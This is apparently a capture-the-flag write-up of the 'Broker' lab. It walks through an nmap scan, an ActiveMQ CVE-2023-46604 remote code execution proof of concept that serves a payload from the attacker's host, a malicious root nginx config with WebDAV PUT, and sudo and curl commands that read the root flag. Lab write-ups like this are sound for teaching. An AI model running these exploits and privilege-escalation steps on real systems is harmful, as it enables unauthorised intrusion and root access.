## Broker

### Lab Details 

- Difficulty: Easy
- Type:ActiveMQ, Linux 

#### Tasks
Q1: Which open TCP port is running the ActiveMQ service?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Broker 10.10.11.243` 
```
61613/tcp open     stomp          syn-ack     Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open     http           syn-ack     Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
61616/tcp open     apachemq       syn-ack     ActiveMQ OpenWire transport 5.15.15
```

Q2: What is the version of the ActiveMQ service running on the box?
- based on the output the version is 5.15.15

Q3: What is the 2023 CVE-ID for a remote code execution vulnerability in the ActiveMQ version running on Broker?
- use searchsploit to find a 2023 CVE for ActiveMQ, however unable to find anything 
- search for online and found 
https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

Q4: What user is the ActiveMQ service running as on Broker?
- fetch and use POC https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
- exmaple below, once executed a pseudoshell appears
- user is activemq
```
─$ python3 exploit.py -i 10.10.11.243 -p 61616 -si 10.10.14.19 -sp 8080
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.10.11.243:61616
[*] Serving XML at: http://10.10.14.19:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ s

Apache ActiveMQ$ 
Please enter a valid command.
Apache ActiveMQ$ ls
activemq
activemq-diag
activemq.jar
env
linux-x86-32
linux-x86-64
macosx
wrapper.jar

Apache ActiveMQ$ whoami
activemq
```
Q5: Submit the flag located in the activemq user's home directory.
- example below
```
# while in the pseudoshell
Apache ActiveMQ$ ls /home/activemq 
user.txt

Apache ActiveMQ$ cat /home/activemq/user.txt
20edaa300fe7a488ef409dbd68062fd5
```

Q6: What is the full path of the binary that the activemq user can run as any other user with sudo?
- i was unable to use `sudo -i` in the pseudoshell, theres two ways to find out the answer for this question is 
    - linPEAS.sh 
    - an interactive shell (python) 
- linPEAS.sh output
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                
Matching Defaults entries for activemq on broker:                                                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

```
- output from interactive shell 
```
$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Q7: Which nginx directive can be used to define allowed WebDAV methods?
- search for nginx directive online will output `dav_methods`

Q8: Which HTTP method is used to write files via the WebDAV protocol?
- according to this article `PUT` is the method to save edited resource back to the HTTP server

Q9: Which flag is used to set a custom nginx configuration by specifying a file?
- according to the output linPEAS.sh this machine is vulnerable to dirty pipe however i was more intrigued in exploiting the nginx configuration as i have never encountered before
- post by `Sanskar Kalra - hBroker Blues: How I Exploited ActiveMQ RCE and Sudo Privileges to Seize Root` gives a good example on how the exploit works.
- the gist below:
 1. generate a malicious nginx config file, config file that would allow the process to run as root
```
$ cat root.conf  
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 9001;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```
 2. load the config file to target 
 3. start up the nginx service with malicious config file
```
$ sudo /usr/sbin/nginx -c /opt/apache-activemq-5.15.15/bin/root.conf
```
 4. fetch the root.txt file using `curl`
```
$ curl http://10.10.11.243:9001       
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               06-Nov-2023 01:10                   -
<a href="boot/">boot/</a>                                              06-Nov-2023 01:38                   -
<a href="dev/">dev/</a>                                               01-Jun-2025 08:48                   -
<a href="etc/">etc/</a>                                               07-Nov-2023 06:53                   -
<a href="home/">home/</a>                                              06-Nov-2023 01:18                   -
<a href="lib/">lib/</a>                                               06-Nov-2023 00:57                   -
<a href="lib32/">lib32/</a>                                             17-Feb-2023 17:19                   -
<a href="lib64/">lib64/</a>                                             05-Nov-2023 02:36                   -
<a href="libx32/">libx32/</a>                                            17-Feb-2023 17:19                   -
<a href="lost%2Bfound/">lost+found/</a>                                        27-Apr-2023 15:40                   -
<a href="media/">media/</a>                                             06-Nov-2023 01:18                   -
<a href="mnt/">mnt/</a>                                               17-Feb-2023 17:19                   -
<a href="opt/">opt/</a>                                               06-Nov-2023 01:18                   -
<a href="proc/">proc/</a>                                              01-Jun-2025 08:48                   -
<a href="root/">root/</a>                                              01-Jun-2025 08:55                   -
<a href="run/">run/</a>                                               01-Jun-2025 08:48                   -
<a href="sbin/">sbin/</a>                                              06-Nov-2023 01:10                   -
<a href="srv/">srv/</a>                                               06-Nov-2023 01:18                   -
<a href="sys/">sys/</a>                                               01-Jun-2025 08:48                   -
<a href="tmp/">tmp/</a>                                               01-Jun-2025 09:20                   -
<a href="usr/">usr/</a>                                               17-Feb-2023 17:19                   -
<a href="var/">var/</a>                                               05-Nov-2023 01:43                   -
</pre><hr></body>
</html>
$: curl http://10.10.11.243:9001/root/        
<html>
<head><title>Index of /root/</title></head>
<body>
<h1>Index of /root/</h1><hr><pre><a href="../">../</a>
<a href="cleanup.sh">cleanup.sh</a>                                         07-Nov-2023 08:15                 517
<a href="root.txt">root.txt</a>                                           01-Jun-2025 08:55                  33
</pre><hr></body>
</html>
$: curl http://10.10.11.243:9001/root/root.txt
af81f2b777260d685f6b11c1644cba52
```



https://medium.com/@sanskarkalra121/broker-blues-how-i-exploited-activemq-rce-and-sudo-privileges-to-seize-root-1f6cede83a8f 



#### Resources
https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

blog for Priv Escalation: https://medium.com/@sanskarkalra121/broker-blues-how-i-exploited-activemq-rce-and-sudo-privileges-to-seize-root-1f6cede83a8f 

#### Lesson Learned
- exploit nginx with only sudo -l


